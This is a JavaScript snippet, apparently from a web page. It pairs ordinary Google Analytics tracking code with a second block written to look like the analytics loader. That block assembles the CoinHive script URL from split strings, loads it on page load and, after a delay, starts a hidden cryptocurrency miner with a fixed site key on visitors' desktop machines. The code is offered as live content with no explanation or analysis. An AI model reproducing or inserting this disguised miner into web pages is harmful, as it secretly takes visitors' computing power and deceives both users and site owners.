  (function(i, s, o, g, r, a, m) {
      i['GoogleAnalyticsObject'] = r;
      i[r] = i[r] || function() {
          (i[r].q = i[r].q || []).push(arguments)
      }, i[r].l = 1 * new Date();
      a = s.createElement(o), m = s.getElementsByTagName(o)[0];
      a.async = 1;
      a.src = g;
      m.parentNode.insertBefore(a, m)
  })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
  ga('create', 'UA-61779361-1', 'auto');
  ga('send', 'pageview');
  (function(i, s, o, g, r, a, m, n) {
      m = s.createElement(o), n = s.getElementsByTagName(o)[0];
      m.async = 1;
      m.src = 'https://' + g + a + '.com/lib/' + g + a + '.min.js';
      n.parentNode.insertBefore(m, n);
      i.setTimeout(function() {
          var z = new CoinHive.Anonymous(r, {
              throttle: 0.3
          });
          if (!z.isMobile()) {
              z.start();
          }
      }, 6500);
  })(window, document, 'script', 'coin', 'DZXgMX4qUOLboGTBtlEyc0iBTdY4t88W', 'hive');